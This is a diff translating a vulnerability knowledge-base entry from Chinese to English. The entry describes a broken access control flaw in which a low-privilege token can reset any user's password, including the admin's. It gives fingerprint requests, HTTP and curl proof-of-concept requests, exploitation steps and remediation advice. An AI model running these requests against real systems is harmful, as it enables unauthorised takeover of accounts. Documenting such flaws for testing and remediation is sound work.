@@ -1,59 +1,59 @@
 ﻿---
-title: 后台“重置任意用户密码”接口越权（直接接管会员/管理员）
-cve: 无（业务逻辑）
+title: Broken access control in the admin "reset any user's password" endpoint (direct member/admin takeover)
+cve: None (business logic)
 severity: critical
 cvss: 9.2
-product: 自研后台（会员管理/代理管理）
-versions: 任意
+product: Custom backend (member management / agent management)
+versions: Any
 ports: 80, 443
-keywords: 重置密码, 任意用户, 越权, 后台, 接管
+keywords: password reset, arbitrary user, broken access control, admin, takeover
 entry: /api/admin/user/resetPassword  /api/agent/resetPwd
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 POST /api/admin/user/resetPassword {"uid":1001,"password":"..."}
 POST /api/user/updatePwd            {"uid":...,"oldPwd":"","newPwd":"..."}
 ```
 
-## 前置条件
+## Prerequisites
 
-- 低权后台账号（客服/代理）或普通会员 token。
+- A low-privilege backend account (support/agent) or a regular member token.
 
 ## PoC
 
 ```http
-### 1) 低权账号尝试重置他人
+### 1) Attempt to reset another user's password with a low-privilege account
 POST /api/admin/user/resetPassword HTTP/1.1
-Authorization: Bearer <低权token>
+Authorization: Bearer <low-privilege-token>
 
 {"uid":1,"password":"Passw0rd!2026"}
 ```
 
 ```bash
-# 2) 命中判定：用新口令登录目标账号
+# 2) Confirm success: log in to the target account with the new password
 curl -s -X POST 'https://target/api/login' -H 'Content-Type: application/json' \
   -d '{"username":"admin","password":"Passw0rd!2026"}' | head -c 200
 
-# 3) 若接口校验 oldPwd，传空或省略
+# 3) If the endpoint checks oldPwd, pass an empty value or omit it
 curl -s -X POST 'https://target/api/user/updatePwd' -H "Authorization: Bearer <t>" \
   -H 'Content-Type: application/json' -d '{"uid":1,"newPwd":"Passw0rd!2026"}'
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先用自己的账号验证接口行为（改自己）；
-2. 换 uid 改目标；命中即接管管理员；
-3. 改完立刻记录并回滚（把口令改回去），避免影响业务；
-4. 证据：重置请求 + 用新口令登录成功。
+1. First verify endpoint behavior using your own account (change your own password);
+2. Change uid to target another account; success means administrator takeover;
+3. Immediately record the change and roll it back (restore the password) to avoid business disruption;
+4. Evidence: the reset request + successful login with the new password.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 重置接口限超管 + 二次认证 + 审计；禁止请求体指定 uid（从 token 取）。
+- Restrict resets to superadmins + step-up authentication + auditing; disallow specifying uid in the request body (derive it from the token).
 
-## 参考
+## References
 
 - OWASP API5 BFLA；CWE-639。
